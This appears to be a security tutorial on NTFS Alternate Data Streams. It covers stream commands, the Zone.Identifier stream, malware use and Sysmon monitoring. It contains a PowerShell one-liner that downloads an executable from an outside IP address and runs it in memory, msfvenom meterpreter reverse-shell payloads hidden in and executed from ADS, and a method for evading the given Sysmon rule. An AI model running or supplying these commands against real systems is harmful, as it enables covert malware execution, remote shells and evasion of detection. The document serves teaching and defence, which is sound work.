## Alternate Data Stream (ADS)

it's introduced with Windows NT 3.1, it's file attribute in NTFS which contains meta data about files

Any file has Data stream which contains the actual data of the file, any other Data stream is called **Alternate** so it's Alternate Data stream, the ADS size is not added to the file size and it's hidden, could only be viewed using some commands

```
dir /R  or dir /R [filename]
```

```powershell
Get-Item -Path [filepath] -Stream *
```
>Alternate streams are not listed in Windows Explorer, and their size is not included in the file’s size.
>When the file is copied or moved to another file system without ADS support the user is warned that alternate data streams cannot be preserved.
>
>-- Andrea fortuna

for any file there is fully qualified file name

`<filename>:<streamname>:<streamtype>`



one of the default ADS is Zone.Identifier which tells the URL which is used to download the file, it's supported since Win XP sp2
to get the URL of file use this command

```powershell
Get-Content -Path [filepath] -Stream Zone.Identifier
```

```powershell
notepad.exe file.txt:Zone.Identifier
```

![Zone Identifier](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/ADS/Misc/ZoneIdentifier.jpg)

- Zone.Identifer is not set when copying file from USB driver or downloading it from torrent -- **I tested it**

- some old browsers just place zone id in the Zone.Identifier ADS
- Any Application can set ADS, many Applications do
- Sysinternal has tool called streams that check for ADS



**to create ADS**

```powershell
set-content -Path {path to the file} - Stream {name of the stream} -Value {Value}
```
to remove ADS
```powershell
Remove-Item –Path {path to the file} –Stream {name of the stream}
```



## ADS in Malwares

ADS is used a lot in malwares because it's not listed in windows explorer 

**Example 1**

```powershell
set-content -path ADS.txt -Stream tDS.js -Value "a = new ActiveXObject(`'Wscript.Shell`');cmd = `"powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://18.185.124.52/ransinvoke.exe')).EntryPoint.Invoke(`$Null,`$Null))"";a.Run(cmd,0);"
```

the above example will create ADS called tDS .js ".js is very important so we can run it"
then for run this script

```powershell
wscript.exe ADS.txt:tDS.js
```

the script will download *ransinvoke.exe* from the remote server then will invoke it directly in the memory
ransinvoke.exe is a .NET application, so it could run directly in memory using PowerShell.
for non .net there is more complex code to run it directly in memory [for Shell code](https://github.com/rapid7/rex-powershell/blob/master/data/templates/to_mem_pshreflection.ps1.template)



**Example 2**

```powershell
findstr.exe /V /L NotHere C:\Users\Noname\Desktop\Attack.js > C:\Users\Noname\Desktop\ADS.txt:Attack.js
```

to execute

```powershell
wscript.exe ADS.txt:Attack.js
```

*Note: Run findstr from cmd not PowerShell and set **full path** not relative path*



**Example 3**

Create dll from MSF venom

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4000 -f dll > /var/www/html/evil.dll
```
Create the ADS
```
type C:\Users\Noname\Desktop\Evil.dll > C:\Users\Noname\Desktop\ADS.txt:evil.dll
```

*run type from cmd not PowerShell and give it full path for the dll not relative path*

Execute the ADS

```powershell
rundll32 c:\Users\Noname\Desktop\ADS.txt:shell.dll,DllMain
```



**Example 4**

Create exe from MSF venom

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4000 -f exe > /var/www/html/shell.exe
```

Create ADS

```powershell
makecab c:\Users\Noname\Desktop\shell.exe c:\Users\Noname\Desktop\shell.cab
extrac32 c:\Users\Noname\Desktop\shell.cab c:\Users\Noname\Desktop\ADS.txt:shell.exe
```

Execute the ADS

```powershell
wmic process call create "C:\Users\Noname\Desktop\ADS.txt:shell.exe"
```

of course it's not only about Metasploit, you can do this with any executable


*you can check Link 7 for more ADS create/execute commands*

 

### ADS Monitoring

Using sysmon we can monitor Adding files to streams using FileCreateStreamHash

```xml
<FileCreateStreamHash onmatch="include">
			<TargetFilename condition="contains">Downloads</TargetFilename> 
			<TargetFilename condition="contains">Temp\7z</TargetFilename>  
			<TargetFilename condition="contains">Startup</TargetFilename> 
			<TargetFilename condition="end with">.bat</TargetFilename> 
			<TargetFilename condition="end with">.cmd</TargetFilename> 
			<TargetFilename condition="end with">.hta</TargetFilename> 
			<TargetFilename condition="end with">.lnk</TargetFilename> 
			<TargetFilename condition="end with">.ps1</TargetFilename> 
			<TargetFilename condition="end with">.ps2</TargetFilename> 
			<TargetFilename condition="end with">.reg</TargetFilename> 
			<TargetFilename condition="end with">.jse</TargetFilename>
			<TargetFilename condition="end with">.vb</TargetFilename>
			<TargetFilename condition="end with">.vbe</TargetFilename> 
			<TargetFilename condition="end with">.vbs</TargetFilename> 
			<TargetFilename condition="end with">.exe</TargetFilename>
    		<TargetFilename condition="end with">.dll</TargetFilename>
    		<TargetFilename condition="end with">.js</TargetFilename>
		</FileCreateStreamHash>
```

*I can create ADS for executable file but without set the extension to exe and use wmic to create the process, like that I will bypass the above rule*

```powershell
makecab "c:\Users\Noname\Desktop\svchost.exe" "c:\Users\Noname\Desktop\svchost.cab"
extrac32 "c:\Users\Noname\Desktop\svchost.cab" "c:\Users\Noname\Desktop\ADS.txt:svchost"
wmic process call create "C:\Users\Noname\Desktop\ADS.txt:svchost"
```

![wmicProcessCreate](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/ADS/Misc/wmicProcessCreate.JPG)

to overcome this problem we can monitor creation for all streams and exclude Zone.Identifier and other legitimate ADS , but of course some one could name his malicious stream "Zone.Identifier"

### Reference

[Tricks to run executables in ADS] https://www.varonis.com/blog/the-malware-hiding-in-your-windows-system32-folder-more-alternate-data-streams-and-rundll32/ 

[Tricks to run executables in ADS] https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/ 

[Tricks to run executables in ADS Part-2] https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/ 

[Check ADs Part]  https://www.andreafortuna.org/2017/10/11/some-thoughts-about-ntfs-filesystem/ 

[Explanation for ADS] https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

[Zone Identifier] https://cyberforensicator.com/2018/06/26/where-did-it-come-from-forensic-analysis-of-zone-identifier/ 

[a lot of Command for creating and executing ADS] https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f 

[Run shell code through ADS] https://github.com/enigma0x3/Invoke-AltDSBackdoor/blob/master/Invoke-ADSBackdoor.ps1 

